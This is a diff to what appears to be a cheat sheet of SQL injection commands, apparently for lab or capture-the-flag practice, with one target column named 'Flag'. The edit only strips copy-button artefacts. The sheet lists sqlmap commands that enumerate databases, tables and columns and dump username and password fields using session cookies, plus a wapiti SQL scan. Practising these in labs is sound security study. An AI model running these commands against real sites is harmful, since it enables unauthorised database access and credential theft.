@@ -163,14 +163,10 @@ sqlmap -u "http://www.xyz.com/profile.aspx?id=1" --cookie="[cookie value that yo
 7.3 sqlmap -u "http://xyz.com/search.php?q=test" --cookie="PHPSESSID=your_session_id" -D database_name --tables
 7.4 sqlmap -u "http://xyz.com/search.php?q=test" --cookie="PHPSESSID=your_session_id" -D database_name -T users --columns
 7.5 sqlmap -u "http://xyz.com/search.php?q=test" --cookie="PHPSESSID=your_session_id" -D database_name -T users -C username,password --dump
-8.1 shCopy code
-    sqlmap -u "http://192.168.xx.xx" --crawl=3 --level=5 --risk=3 --dbs
-8.2 shCopy code
-    sqlmap -u "http://192.168.xx.xx" --crawl=3 --level=5 --risk=3 -D database_name --tables
-8.3 shCopy code
-    sqlmap -u "http://192.168.xx.xx" --crawl=3 --level=5 --risk=3 -D database_name -T table_name --columns
-8.4 shCopy code
-    sqlmap -u "http://192.168.xx.xx" --crawl=3 --level=5 --risk=3 -D database_name -T table_name -C Flag --dump
+8.1 sqlmap -u "http://192.168.xx.xx" --crawl=3 --level=5 --risk=3 --dbs
+8.2 sqlmap -u "http://192.168.xx.xx" --crawl=3 --level=5 --risk=3 -D database_name --tables
+8.3 sqlmap -u "http://192.168.xx.xx" --crawl=3 --level=5 --risk=3 -D database_name -T table_name --columns
+8.4 sqlmap -u "http://192.168.xx.xx" --crawl=3 --level=5 --risk=3 -D database_name -T table_name -C Flag --dump
 9.1 wapiti -u <url> -m sql
 9.2 sqlmap -u <Vulnerable url> --dbs
 9.3 sqlmap -u <Vulnerable url> -D <database name> --tables  This Will give the names of the tables
